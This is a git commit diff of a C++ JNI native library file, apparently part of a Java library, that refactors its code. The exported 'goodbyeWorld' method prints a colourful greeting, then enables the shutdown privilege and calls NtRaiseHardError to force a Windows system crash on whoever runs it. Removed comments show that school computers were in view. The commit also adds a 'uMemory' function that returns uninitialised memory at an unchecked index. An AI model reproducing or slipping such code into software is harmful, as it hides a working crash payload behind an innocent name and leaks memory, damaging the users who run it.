1de956cc3b3a861752d56bb743894011ddcea6ca
SnakerBone <raxxtq@gmail.com>
2023-11-22 20:24:08 +1100

    Update

--- snkr.cpp
+++ snkr.cpp
@@ -4,102 +4,134 @@
 #include <cstdlib>
 #include <ctime>
 
+#include <bugcodes.h>
 #include <windows.h>
 #include <ntstatus.h>
 #include <winternl.h>
-#include <bugcodes.h>
 #include <jni.h>
 
 using namespace std;
 
+struct UninitializedArray
+{
+    long value[1024];
+};
+
+UninitializedArray UninitializedArrayImpl(const int alloc)
+{
+    UninitializedArray array;
+
+    for (int i = 0; i < alloc; i++) {
+        array.value[i];
+    }
+
+    return array;
+}
+
 typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFn)
-        (
-                ULONG Privilege,
-                BOOLEAN Enable,
-                BOOLEAN CurrentThread,
-                PBOOLEAN Enabled
-        );
+(
+    ULONG Privilege,
+    BOOLEAN Enable,
+    BOOLEAN CurrentThread,
+    PBOOLEAN Enabled
+);
 
 RtlAdjustPrivilegeFn RtlAdjustPrivilege;
 
 typedef NTSTATUS (NTAPI *NtRaiseHardErrorFn)
-        (
-                LONG ErrorStatus,
-                ULONG Unless1,
-                ULONG Unless2,
-                PULONG_PTR Unless3,
-                ULONG ValidResponseOption,
-                PULONG ResponsePointer
-        );
+(
+    LONG ErrorStatus,
+    ULONG Unless1,
+    ULONG Unless2,
+    PULONG_PTR Unless3,
+    ULONG ValidResponseOption,
+    PULONG ResponsePointer
+);
 
 NtRaiseHardErrorFn NtRaiseHardError;
 
-int adjustPrivilege(JNIEnv *env, jobject obj)
+int clamp(int value, const int min, const int max)
 {
-    BOOLEAN Enabled = FALSE; // Enable this function
-    HMODULE NtDll = GetModuleHandle("ntdll.dll"); // Get the retro library lol
-
-    if (NtDll == NULL) {
-        return -1; // This user is probably not running on a windows computer
+    if (value > max) {
+        value = max;
+    }
+    else if (value < min) {
+        value = min;
     }
 
-    RtlAdjustPrivilege = (RtlAdjustPrivilegeFn) GetProcAddress(NtDll, "RtlAdjustPrivilege"); // Get the internal function
+    return value;
+}
 
-    if (RtlAdjustPrivilege == NULL) {
-        return -1; // This function does not exist (somehow)
+int adjust_privilege()
+{
+    BOOLEAN Enabled = FALSE;
+    const HMODULE NtDll = GetModuleHandle("ntdll.dll");
+
+    if (NtDll == nullptr) {
+        return -1;
     }
 
-    NTSTATUS Status = RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled); // Adjust the privileges to give snakerlib.dll admin!
+    RtlAdjustPrivilege = reinterpret_cast<RtlAdjustPrivilegeFn>(GetProcAddress(NtDll, "RtlAdjustPrivilege"));
 
-    if (Status != 0) {
-        return -1; // They are probably running on a restricted school computer...
+    if (RtlAdjustPrivilege == nullptr) {
+        return -1;
+    }
+
+    if (const NTSTATUS Status = RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled); Status != 0) {
+        return -1;
     }
 
     if (Enabled) {
-        return 0; // Privileges added successfully
-    } else {
-        return -1; // Could not add privileges...
+        return 0;
     }
+
+    return -1;
 }
 
-int raiseHardError(JNIEnv *env, jobject obj)
+int raise_hard_error()
 {
-    ULONG ErrorResponse = 0; // This error response
-    HMODULE NtDll = GetModuleHandle("ntdll.dll"); // Get the retro library lol
+    ULONG ErrorResponse = 0;
+    const HMODULE NtDll = GetModuleHandle("ntdll.dll");
 
-    if (NtDll == NULL) {
-        return -1; // This user is probably not running on a windows computer
+    if (NtDll == nullptr) {
+        return -1;
     }
 
-    NtRaiseHardError = (NtRaiseHardErrorFn) GetProcAddress(NtDll, "NtRaiseHardError"); // Get the internal function
+    NtRaiseHardError = reinterpret_cast<NtRaiseHardErrorFn>(GetProcAddress(NtDll, "NtRaiseHardError"));
 
-    if (NtRaiseHardError == NULL) {
-        return -1; // This function does not exist (somehow)
+    if (NtRaiseHardError == nullptr) {
+        return -1;
     }
 
-    NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // Raise a hard error
-
-    if (Status != 0) {
-        return -1; // Could not add privileges...
+    if (const NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, nullptr, 6, &ErrorResponse); Status != 0) {
+        return -1;
     }
 
-    return 0; // Privileges added successfully
+    return 0;
 }
 
-JNIEXPORT void JNICALL Java_xyz_snaker_snakerlib_SnakerLibNatives_goodbyeWorld(JNIEnv *env, jobject obj)
+JNIEXPORT void JNICALL Java_bytesnek_hiss_sneaky_SNKR_goodbyeWorld(JNIEnv* env, jobject obj)
 {
-    srand(time(0));
+    srand(time(nullptr));
 
     const string RESET = "\u001b[0m";
 
-    for (char c: "Goodbye, World!") {
-        int randomColour = rand() % 216 + 16; // Get a random colour for each character
+    for (const char c: "Goodbye, World!") {
+        const int randomColour = rand() % 216 + 16;
 
-        cout << "\u001b[1m\u001b[3m\u001b[4m" << "\u001b[38;5;" << randomColour << "m" << c << RESET; // Print out a lovely colourful message
+        cout << "\u001b[1m\u001b[3m\u001b[4m" << "\u001b[38;5;" << randomColour << "m" << c << RESET;
     }
 
     cout << RESET << endl;
 
-    adjustPrivilege(env, obj); // Adjust privileges
-    raiseHardError(env, obj); // Raise err
+    adjust_privilege();
+    raise_hard_error();
+}
+
+JNIEXPORT jlong JNICALL Java_bytesnek_hiss_sneaky_SNKR_uMemory(JNIEnv* env, jobject obj, jint alloc, jint index)
+{
+    const int clamped = clamp(alloc, 0, 1024);
+    auto [value] = UninitializedArrayImpl(clamped);
+
+    return value[index];
 }
